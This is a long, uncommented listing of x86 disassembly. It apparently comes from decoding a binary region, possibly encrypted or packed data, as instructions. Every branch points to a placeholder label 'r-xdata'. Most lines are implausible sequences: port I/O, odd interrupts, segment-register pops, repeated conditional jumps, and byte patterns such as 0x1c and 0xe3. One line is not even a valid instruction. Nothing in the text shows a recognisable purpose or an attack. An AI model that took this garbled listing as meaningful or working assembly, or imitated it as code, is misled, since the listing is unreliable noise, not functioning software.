sar [ eax ] 0x1
fcom [ eax ]
or ch [ edx + 0x731c1c0a ]
outsb
cmpsd [ esi ] [ edi ]
sbb al 0x97
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
jecxz r-xdata
adc ah ch
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and eax [ ebp + 0xa1da66a ]
movsd [ edi ] [ esi ]
shl ebx cl
fisttp [ 0xffffffffbfa56ab4 ]
sub al 0x8
sbb al 0x1c
push 0xe3e35f65
or dh [ ecx + 0x73e3e3e7 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
or cl bl
outsb
sub ebx [ esi ]
sbb al 0x1c
or ebx [ edx ]
mov esp 0x85b98f89
push 0xffffffb6
int 0x85
push 0xffffffb6
ror [ edx ] cl
mov bh 0x8
sbb al 0x1c
jae r-xdata
or bh [ ebx ]
out 0xe3 eax
jecxz r-xdata
pushad
daa
aaa
or edi edi
sbb [ esp + ebx ] bl
mov edx 0x1c13f40a
pushad
xchg edi eax
sbb al 0x1c
or al [ ebp + 0x1e ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
mov bl 0xa
or [ eax ] ebx
sbb al 0x1c
pxor mm5 [ esi - 0x5a ]
jae r-xdata
lea esi [ ebp - 0x6ef55152 ]
jae r-xdata
enter 0xe3e3 0x73
jae r-xdata
jecxz r-xdata
pushad
jae r-xdata
jae r-xdata
jae r-xdata
push ds
jecxz r-xdata
int1
jae r-xdata
jae r-xdata
les cx [ eax ]
sbb al 0x1c
or esi [ edx - 0xb ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
mov ecx [ esp + ebx ]
pop ebx
mov ebx 0x24b58d86
jecxz r-xdata
psrlq mm4 mmx1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0x85
push 0xe085e1a4
cmpsd [ esi ] [ edi ]
imul esp ebx 0xffffffe2
jecxz r-xdata
out dx eax
or bl [ edi ]
hlt
sbb al 0x75
dec edi
aas
mov ebx 0x1c14a00a
mov al 0x1c
jne r-xdata
in al 0xe3
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
or al cl
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
xchg [ esp + ebx ] bx
jae r-xdata
push esp
jae r-xdata
jae r-xdata
jae r-xdata
mul bl
shl [ ebx ] 0x1
mov edx 0x1bbe6aba
sbb al 0x1c
jae r-xdata
push 0x14750a0f
clc
jecxz r-xdata
jae r-xdata
or bl [ esi ]
cld
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
outsb
jae r-xdata
pushad
cmpsb [ esi ] [ edi ]
sbb ecx ebx
fisub [ esi - 0x549e13e9 ]
int 0xe3
jecxz r-xdata
jecxz r-xdata
and bp sp
jae r-xdata
adc al 0x1c
or esi ecx
jae r-xdata
lfs ecx [ ecx - 0x2c1c7419 ]
mov esp ebx
shl ebx cl
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
scasb [ edi ]
mov ebx 0x23a62486
mov ch 0x24
xchg esi eax
or cl [ ecx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and cx [ edx ]
sbb al 0x1c
pushad
jae r-xdata
or ah [ edx + 0x1a ]
sbb al 0x1c
mov [ 0x1fa6e01b ] eax
test [ edx - 0x5a ] ebp
xor eax 0x859089bb
push 0xffffffa6
cmp edi [ ebx + 0x6a858089 ]
cmpsb [ esi ] [ edi ]
cmp [ eax + 0x22 ] ebp
test [ edx - 0x5a ] ebp
jecxz r-xdata
jae r-xdata
pushfd
out 0xe3 eax
in al dx
int1
xlat
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
sbb al 0x60
xchg edi eax
mul ebx
outsb
fnstsw ax
pushad
mov edi 0xdc0af7c7
add ecx [ edx ]
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
sbb al 0x96
out dx eax
mov ebx esp
push 0xffffffa6
jae r-xdata
pop ds
jae r-xdata
mov ebx 0xb32354ec
jae r-xdata
pushad
cwde
mov esi 0xa9189b3
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb bl [ esp + ebx ]
jae r-xdata
inc ebp

push 0xffffffa6
out dx eax
or dh [ eax ]
pop es
sbb al 0x66
jae r-xdata
sbb al 0x60
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
jae r-xdata
pop es
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
pushad
in al dx
jae r-xdata
sbb al 0x1c
call 0x612a10dd
jecxz r-xdata
mov [ ecx - 0x1c0934f6 ] edx
jae r-xdata
std
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
cmpsb [ esi ] [ edi ]
aaa
mov bl 0x1c
xchg ebp eax
mov bl 0xa
cmp edi eax
jecxz r-xdata
in al dx
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
pop ss
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
pop ds
pop ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xa66a1ba6
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
test [ eax - 0x23 ] esp
jecxz r-xdata
and esi [ ebx - 0x6ff4da98 ]
jae r-xdata
jae r-xdata
daa
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
pop es
mov al 0xb3
or ecx [ ebx + 0x17 ]
sbb al 0x1c
or bl [ edi + 0x731c1c19 ]
jae r-xdata
or edx [ edi + edx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
imul esi [ eax + 0x17540bb3 ] 0x1c
lahf
mov edx 0xcf0a2366
adc [ esp + ebx ] bl
or ebp ebx
sahf
loope r-xdata
mov dh 0xa
xor [ edi ] al
jae r-xdata
push 0xffffffa6
pop ss
mov al 0xb3
or esi [ eax + edx ]
sbb al 0x1c
pushad
mov bl 0x25
cmpsb [ esi ] [ edi ]
sbb al 0xe3
or edi [ 0xffffffffb31c1c0e ]
cmpsb [ esi ] [ edi ]
sbb al 0xb5
mov bl 0xa
mov ch cl
jecxz r-xdata
rcl [ edi ] cl
sbb al 0x1c
mov [ edi + 0x1c87666e ] esp
sbb al 0x1c
mov ch 0xb3
or cl [ edx + 0x73e3e3e9 ]
jae r-xdata
adc bx si
jecxz r-xdata
push 0x17900b25
jae r-xdata
jae r-xdata
pop ss
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
or cl [ ebx + 0xa ]
sbb al 0x1c
jae r-xdata
sbb al 0x1c
in al 0xfb
sub dh [ ebp - 0x49957a4d ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
sbb al 0xb3
outsb
aaa
push ds
sbb al 0x1c
mov bl 0xb
mov [ 0x60e3e3eb ] al
sbb al 0xb3
or dl [ eax ]
add eax 0xec731c1c
push 0xffffffa6
jae r-xdata
outsb
or ah [ esi + 0x1 ]
daa
out dx eax
push 0xffffffa7
or edx [ eax + 0x601c1c17 ]
jae r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
test [ eax - 0x68 ] esp
mov dl 0xb3
sbb al 0x96
pop es
sbb al 0xb4
push 0xa6e01ba3
pop ds
jae r-xdata
sbb al 0x1c
jae r-xdata
iretd
add eax 0xf9920abb
jecxz r-xdata
test [ edx - 0x5a ] ebp
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
or dl [ ebx + 0x73e3e3fc ]
jae r-xdata
add eax 0x13ae6a85
or dl [ edi + 0x1d ]
mov bl 0x85
jae r-xdata
mov ch 0xe2
jecxz r-xdata
sahf
out 0xe3 eax
jecxz r-xdata
jae r-xdata
rcr [ eax + ebp * 2 ] 0x1
xchg edi eax
jae r-xdata
pop ss
push 0x9e6a851d
pop ebp
xchg [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
mov ebx 0xe3f9920a
jecxz r-xdata
jae r-xdata
or [ esp + ebx ] ebx
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
cld
jae r-xdata
push 0xffffffb6
jae r-xdata
jecxz r-xdata
or edx [ esi ]
sbb al 0x1c
mov [ 0xb666eb3 ] eax
pop ds
movsb [ edi ] [ esi ]
ficomp [ eax - 0x4a991335 ]
loop r-xdata
sbb bl [ esp + ebx ]
rcl [ 0x67ec2366 ] 0x1
bswap ebx
pushad
fucom st3
in al dx
and ecx [ ecx - 0x59957a09 ]
jae r-xdata
pop ss
pushad
and ch bl
or ah ah
sbb ebx [ esp + ebx ]
jae r-xdata
push 0xd0075e97
sub ch [ eax - 0x42 ]
pop ss
push 0x1c193035
jae r-xdata
cmpsb [ esi ] [ edi ]
xor edi [ ebx + 0x6a858689 ]
cmpsb [ esi ] [ edi ]
cmp [ esi - 0x5a ] ch
jae r-xdata
jecxz r-xdata
and bp sp
bswap ebx
jecxz r-xdata
arpl [ esi + 0x66ece1f3 ] bx
in al 0xfb
retn
jae r-xdata
jae r-xdata
outsb
jae r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xa66a1fa6
sub ah [ eax ]
jae r-xdata
jecxz r-xdata
out 0xe3 ax
adc [ 0xffffffffec731c1c ] al
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0xb3
or ebx eax
push cs
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
and edx eax
test [ ebp - 0x7ae45996 ] 0x6e0dae6a
test [ edx - 0x5a ] ebp
or eax 0x1c1fe50a
sbb al 0x73
jae r-xdata
pop esi
pop es
jae r-xdata
mov bl 0xec
push esp
in al 0xb3
test [ eax - 0x5c ] ebp
loope r-xdata
push esp
jae r-xdata
sar [ ebx + 0x6a85c689 ] 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
imul esi [ ebx + ecx - 0x1c1c17dd ] 0xbaba3b68
push 0xffffffbe
pop ds
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
adc ecx [ edx ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
nop [ esp + ebx ] bx
mov bl 0x68
adc al 0xb
jpo r-xdata
mov bl 0x6e
or bx [ edi ]
and ecx [ edx ]
test [ esi ] dl
sbb al 0x1c
mov bl 0xb
fmul [ esi ]
pushad
daa
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
loopne r-xdata
push ss
shr [ edx ] 0x1
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
xor [ edx ] ecx
push edx
out 0xe3 eax
jecxz r-xdata
push 0xffffffa6
loopne r-xdata
mov bl 0x68
jae r-xdata
mov ch 0x1c
mov ah 0xaf
push 0x65
dec ebx
jecxz r-xdata
xchg esi eax
test [ edx - 0x4a ] ebp
and bp sp
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
push 0xc30f600f
mov al 0xa
int 0x12
sbb al 0x1c
jae r-xdata
in al dx
mov bx 0xe3c9
jecxz r-xdata
outsb
push di
sbb ebx [ esp + ebx ]
mov bl 0xd0
cmp [ eax - 0x1c3dc5f6 ] dh
jecxz r-xdata
jae r-xdata
jae r-xdata
imul ebx [ bx + di ] 0xc18b1c1c
loope r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
push edi
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
daa
sub ah [ eax ]
in al dx
xchg ebp ebp
pushad
cmpsb [ esi ] [ edi ]
sbb eax [ ebp + 0x6e0dae6a ]
push 0xffffffa6
adc eax 0xf78923d0
test [ edx - 0x5a ] ebp
enter 0xe3e3 0x73
jae r-xdata
mov ch 0xb3
jae r-xdata
push 0x356817be
xor [ ecx ] bl
sbb al 0xa6
or ch [ eax ]
jmp r-xdata
int 0xe3
jecxz r-xdata
and eax 0x1c17900b
sbb al 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx eax
and ebp esp
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp ah ch
or esp [ ebx ]
call 0x3baf13a6
mov edx 0x1fbe6aba
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov esi 0xc9a00a1f
jae r-xdata
jae r-xdata
add edi [ ebx - 0x4ff56f77 ]
mov ecx eax
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
test [ edx - 0x4a ] ebp
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
jae r-xdata
loop r-xdata
jae r-xdata
mov ch 0xb4
or dh ah
or [ esp + ebx ] ebx
jae r-xdata
mov edi 0x60e3e3e9
loope r-xdata
out dx eax
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx esp
jae r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x7373202a ] eax
xchg esi eax
mov ebx 0x6a85c689
cmpsb [ esi ] [ edi ]
mov [ esi + 0xfb66a85 ] edx
mov ecx 0xdb66a85
mov [ esi - 0x1c1f5af6 ] ecx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x5
test [ edx - 0x52 ] ebp
mov eax 0x7373202a
sar [ eax ] 0x1
outsb
cmpsb [ esi ] [ edi ]
xchg ebp eax
or ch dh

push 0x9e6a8518
and ebp [ eax + 0x1a ]
or dl [ edx + 0x73e3e3cd ]
sbb eax 0x5d9e6a85
mov ebp ecx
jecxz r-xdata
sbb al 0x96
jae r-xdata
and al dl
jae r-xdata
jecxz r-xdata
jmp r-xdata
xchg ebx eax
sbb [ esp + ebx ] ebx
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
push 0x6ababa3b
mov esi 0xec38661f
jecxz r-xdata
stosd [ edi ]
retn
mov dl 0xb4
push 0x4b741c1b
in al dx
adc ax 0xe3fb
jecxz r-xdata
and esp [ ebx + 0x7373202a ]
mov al 0xa
dec ecx
int1
jecxz r-xdata
in al dx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
aas
fsub [ ebp - 0x44991329 ]
leave
jecxz r-xdata
dec ebx
and ebp esp
fld st5
jecxz r-xdata
jae r-xdata
lahf
push ds
sbb al 0x1c
mov bl 0xd0
adc eax 0xafb41cb5
cmp dh ah
and eax 0x688bd0e7
mov esi 0xe0f8681f
xor ch [ edx - 0x41 ]
shr eax cl
test eax ebx
xor ch ah
or ecx [ edx ]
jae r-xdata
sub ah dh
pop ecx
jae r-xdata
and esi [ ebx - 0x200f54d ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jge r-xdata
jae r-xdata
sub ebx edi
sbb al 0xb4
iretd
daa
mov [ 0x25d2308b ] eax
or edi [ edi + 0x60e3e3e9 ]
jae r-xdata
jecxz r-xdata
fidivr [ esi - 0x365ff5e1 ]
jae r-xdata
jae r-xdata
pushad
xchg [ edi ] bl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xf6
jecxz r-xdata
and esp esi
mov [ edx ] ch
out 0x59 al
and eax 0x73e3e3ea
jae r-xdata
enter 0xe3f1 0xe3
push 0x54ec1bbe
fdiv [ edx ]
in al dx
jecxz r-xdata
test [ edx - 0x9 ] ebp
push 0x9e6a851d
sbb eax edx
sbb al 0xa
or ebp [ ebx + 0x1ce3e3fc ]
pop edi
mov bl 0xa
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa6
pop ss
push 0xffffffa6
sbb ecx [ edx ]
lar ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
or ch [ ebx + 0x73e3e3c3 ]
jae r-xdata
jae r-xdata
ud1 eax [ ebp - 0x76f24996 ]
push 0xffffffb6
lahf
adc [ esp + ebx ] bl
or bh ch
rcl [ 0x65ec20d8 ] 0x1
mov bl 0x24
jecxz r-xdata
std
jecxz r-xdata
mov ebx 0xb00a9089
and [ ebx + 0x73 ] dh
or dl dh
scasb [ edi ]
sub eax 0x731c1c07
jae r-xdata
xchg esi eax
jae r-xdata
push cs
sbb al 0x1c
or bl [ eax - 0x761c1c10 ]
jecxz r-xdata
shr edi cl
and eax 0x20f3d3a7
xchg edi eax
jae r-xdata
jae r-xdata
jae r-xdata
retn 0xe3e3
sbb al 0xa
std
daa
out dx eax
ficomp [ eax + 0x1566ecdf ]
sti
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xa4ba66e ]
jae r-xdata
mov ch 0xb4
push 0xffffffa6
pop ds
or ch [ ecx ]
sti
sbb al 0x30
push 0xec156613
mov ch 0x19
sbb al 0x1c
mov ebx [ edi + 0x38 ]
dec eax
pop esi
mov ah 0x6a
pop ebp
daa
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x68
sbb ebx [ esp + esi * 2 ]
dec ebx
push 0xa1c661b
jecxz r-xdata
sbb eax 0x119e6a85
or al [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffff97
jecxz r-xdata
jae r-xdata
or ah [ 0x73e3e3ea ]
jae r-xdata
mov bl 0x6e
jae r-xdata
movnti [ eax + 0x1c12cd0a ] esi
sbb al 0x73
jae r-xdata
push es
sbb al 0xa
jecxz r-xdata
jae r-xdata
stosd [ edi ]
shl bl 0xe3
scasb [ di ]
pop ss
sbb al 0x1c
jae r-xdata
push 0x9e6a851d
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop edi
adc [ edx ] ecx
pop es
push 0xffffff9e
adc ebp [ eax + 0x1d ]
jecxz r-xdata
jmp 0x27a7150a
jecxz r-xdata
0x7373e3e3 0x3888
outsb
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
call [ ecx ]
sbb al 0x1c
outsd
pop ds
adc al 0x1c
sbb al 0x89
jecxz r-xdata
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xa
sbb eax [ ebx ]
sbb al 0x1c
jae r-xdata
sbb al 0x65
test [ edx - 0x62 ] ebp
in al dx
jae r-xdata
or ah [ ebx - 0x3f ]
jae r-xdata
pushfd
shl ebx cl
jecxz r-xdata
push ebx
mov ch 0x68
sbb eax 0x199e6a85
rcr [ edx + ecx ] 0x1
jae r-xdata
shl [ ebx ] 0x1
mov bl 0xb3
or bh bh
std
sbb esp [ esi + 0x1c ]
or cl [ ebx + 0x73e3e3e9 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or al 0x14
sbb al 0x1c
mov ah 0x12
sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]

stosd [ edi ]
loope r-xdata
sbb ebp esp
push esp
xlat
jecxz r-xdata
pop ds
loopne r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ 0x731c1c07 ]
jae r-xdata
mov [ edi - 0x1c1fe6f6 ] eax
jecxz r-xdata
and edi [ edx + ebp + 0x73737320 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
and [ ebx ] esi
or cl bh
out dx al
jecxz r-xdata
add [ ebx + 0x6a85aa89 ] edi
cmpsb [ esi ] [ edi ]
pop es
mov ebx 0x6a858789
cmpsb [ esi ] [ edi ]
add eax 0x858689bb
push 0xffffffa6
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cld
jecxz r-xdata
push 0xffffffa6
sbb ecx [ edx ]
mov [ 0x73e3e3ee ] eax
in al dx
pop es
jae r-xdata
bound ebx [ ebp + 0x5f ]
push 0xdf0f600f
mov al 0xd0
and esi [ ebp - 0x1c0431f6 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
jecxz r-xdata
pop ebp
pop edi
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jecxz r-xdata
jae r-xdata
jae r-xdata
hlt
push 0xffffffa6
jae r-xdata
mov al 0x3e
jae r-xdata
pop edi
mov bl 0x68
and eax 0x1c0b3d0a
sbb al 0x73
test [ eax - 0x26 ] esp
jecxz r-xdata
and ecx [ edx ]
imul eax [ edi ] 0x1c
sbb al 0x73
jae r-xdata
mov dh 0xa
shl bh 0xe3
aas
jae r-xdata
mov ebx 0x6a858d89
cmpsb [ esi ] [ edi ]
aaa
mov ebx 0xe20a9789
add ebx [ esp + ebx ]
jae r-xdata
mov ebp 0x73e3e3ce
in al dx
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
mov al [ 0xffffffffbc1c1c16 ]
push 0x3fe50a25
aad 0x1
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
xor al [ ebp - 0x2fec4996 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
sub [ ecx + 0x6a859489 ] edi
sbb al 0x97
sbb al 0x1c
jae r-xdata
pop edi
lea esi [ ebp - 0x1af55152 ]
cmp eax 0x73731c1c
mov ebx eax
test [ edx - 0x5a ] ebp
or [ ebx - 0x1c3887f6 ] edi
jecxz r-xdata
daa
stosd [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
mov [ esi + 0xba66a85 ] eax
jae r-xdata
or dh dh
add [ esp + ebx ] ebx
jae r-xdata
sbb al 0xc8
adc ah [ edi + 0x31 ]
jecxz r-xdata
sbb al 0x1c
mov esp 0xe50a2568
xchg esi eax
sbb al 0x1c
aad 0x1
jae r-xdata
or edi [ ebx - 0x1c3e9cf6 ]
mov ebx 0x6a858689
push esp
test [ edx - 0x9 ] ebp
in eax dx
test [ esi + 0x31 ] esp
in al dx
enter 0x6712 0x31
add [ esp + ebx ] ebx
jae r-xdata
jo r-xdata
xor esp ebp
jecxz r-xdata
jae r-xdata
jmp 0xffffffffb5f7176c
jae r-xdata
or ch [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x2b66ecf3
aas
jae r-xdata
xor [ ebp - 0x46ee4996 ] eax
mov [ edi + 0x2bb66a85 ] ecx
push 0xffffffb6
jae r-xdata
jae r-xdata
mov dh 0x2f
and bp sp
or bh dh
mul ebx
cmpsb [ esi ] [ edi ]
nop
and ebp esp
jae r-xdata
mov ecx 0xe3f4f20a
jecxz r-xdata
xchg esp eax
test [ edx - 0x4a ] ebp
das
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebp + 0x73e3e3ce ]
retn
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] ecx
sbb eax esp
jecxz r-xdata
jae r-xdata
mov ebp 0xeba66820
push 0xffffffa6
pop ds
or dl [ ecx + 0x731c1c1c ]
jae r-xdata
jae r-xdata
jae r-xdata
or bh bh
adc [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
stc
jecxz r-xdata
jae r-xdata
sbb al 0x1c
in al dx
sub di [ edi ]
jae r-xdata
sbb al 0xa
mov esp 0x731c1c3e
jae r-xdata
ja 0xffffffffb12a1771
mov bl 0xb0
mov al 0x89
in al 0xb0
or dl [ edx + ecx ]
adc al 0xb
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
and ebp esp
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
jae r-xdata
cmp bx [ esi ]
sbb al 0x1c
or al dh
in eax dx
jecxz r-xdata
jae r-xdata
push 0x1c1e3b66
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
inc bx
push ss
sbb al 0x1c
or bh [ esi + edi + 0x73731c1c ]
jae r-xdata
cmp eax 0x42871c1c
adc edx eax
push 0xb66a8532
jae r-xdata
adc eax 0x120a9189
loop r-xdata
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
fbstp [ eax + 0xab523d0 ]
jae r-xdata
or dh [ eax + 0x731c1c3e ]
jae r-xdata
into
sti
jecxz r-xdata
pandn mm6 [ eax + 0xab523d0 ]
jecxz r-xdata
or al al
mul ebx
pop ss
mov [ esi - 0x59957a45 ] eax
push 0xffffffa6
and bl [ edx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
xchg [ ebp - 0x46a04996 ] eax
mov [ ecx + 0x5db66a85 ] eax
or dl [ edx - 0xf ]
jecxz r-xdata
sub edi [ edi ]
jae r-xdata
and ecx [ edx ]
jae r-xdata
mov ch 0xb4
push 0xa38d01b
sbb al 0x1c
jae r-xdata
jae r-xdata
mov esi 0x9e6a8505
jae r-xdata
add eax 0x159e6a85
mov esi 0xb66a8507
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
sbb al 0x1c
jae r-xdata
and esp ebx
mov ebx 0xe3c1630a
jae r-xdata
and esp ebx
jecxz r-xdata
or ah [ esi - 0x78e3e3c3 ]
inc edx
jae r-xdata
or ah ah
hlt
test [ edx - 0x4a ] ebp
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in eax 0xe3
mov edi 0x1c1bcf0a
xchg edi eax
sbb al 0x1c
jae r-xdata
aad 0xb4
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp esp
mov al 0xa
adc al 0xa
and al 0xa6
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0xb3
jae r-xdata
jecxz r-xdata
sub ch ah
jae r-xdata
adc eax 0xbfb66a85
test [ edx - 0x62 ] ebp
jae r-xdata
mov eax [ 0xffffffff85b93a68 ]
test [ edx - 0x4a ] ebp
jae r-xdata
test [ edx - 0x5a ] ebp
sbb edx eax
and eax [ ebp + 0x6e19a66a ]
aaa
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x731c1c0b
fsub [ eax ]
arpl cx ax
mov eax 0xebbe6a85
or bl [ ebx + edx * 8 - 0x59971c1d ]
mov edi edx
jecxz r-xdata
push 0x65
and esp ebx
push 0xb66a8533
mov dh 0x13
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
adc [ ecx + 0x6a858f89 ] edi
mov dh 0x2b
bound ecx [ edi ]
jae r-xdata
shr [ edx - 0x69 ] cl
test eax 0xece3e3ee
push esp
not [ edx + 0xa332160 ]
iretd
adc eax 0x65ec20d8
push 0xffffffa6
and al 0xe3
loope r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
shl ebp 0xe3
jecxz r-xdata
push 0x65
mov [ ebx - 0x1c2c1c75 ] esp
pop ebx
jae r-xdata
outsb
mov ch 0xb3
or edx [ eax ]
push cs
sbb al 0x1c
in al dx
cli
or bl [ esp + ebx ]
shl [ ebx ] 0x1
mov ah 0x1c
mov ch 0x83
or cl [ edi + 0x73e3e3e5 ]
jae r-xdata
shr [ edx ] 0x1
test [ edx - 0x15 ] ebp
and [ ebx + 0x73 ] dh
jae r-xdata
bound esp [ edi ]
jecxz r-xdata
mov [ edx - 0x7a727647 ] ecx
push 0xffffffb6
mov dh 0xbf
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sahf
jae r-xdata
mov dh 0xa1
jae r-xdata
mov ecx 0x6a858d89
jae r-xdata
jae r-xdata
push 0xffffff9e
jae r-xdata
cmp bh [ ecx + 0x5be6a85 ]
xor [ edx ] ecx
test [ ecx ] 0x1c
sbb al 0x73
loopne r-xdata
mov al 0xb5
mov ah 0x68
sbb edx eax
cmp [ edx ] cl
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x7373202a
jae r-xdata
jecxz r-xdata
lodsb [ esi ]
dec ecx
or ebx [ esp + ebx ]
jae r-xdata
loopne r-xdata
jae r-xdata
xchg ebp eax
mov bl 0x1c
xchg ebp eax
xlat
sbb al 0x96
pop es
or bl [ ebx + 0x73e3e3f9 ]
jae r-xdata
or bh [ edx ]
push ebx
pop edi
jecxz r-xdata
jae r-xdata
retn
or ch [ eax + 0x7373e3e3 ]
jae r-xdata
jae r-xdata
and esp ebx
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ebp 0x661c1c0e
and ebp esp
out 0xe3 al
jecxz r-xdata

mov al [ 0xffffffffe3672462 ]
or esi [ esi - 0xd ]
int1
jecxz r-xdata
sub ch ah
test [ edx - 0x4a ] ebp
jae r-xdata
push 0x6a85b93a
jae r-xdata
lea eax [ ebp - 0x46424996 ]
mov [ edi - 0x1c39eff6 ] eax
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mul [ edx - 0x1c3a17f6 ]
jecxz r-xdata
